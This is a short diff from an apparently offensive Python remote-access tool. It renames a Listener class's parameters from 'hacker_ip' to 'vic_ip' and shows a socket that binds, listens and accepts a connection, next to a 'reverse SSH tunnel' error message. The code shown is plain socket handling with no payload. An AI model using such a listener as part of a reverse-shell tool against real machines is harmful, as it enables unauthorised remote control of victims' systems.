@@ -14,10 +14,10 @@ class Listener:
             except Exception as e:
                 print(f"Error establishing reverse SSH tunnel: {e}")
 
-    def __init__(self, hacker_ip, hacker_port):
+    def __init__(self, vic_ip, vic_port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((hacker_ip, hacker_port))
+        listener.bind((vic_ip, vic_port))
         listener.listen(0)
         print("[+] Waiting for incoming connections")
         self.connection, address = listener.accept()
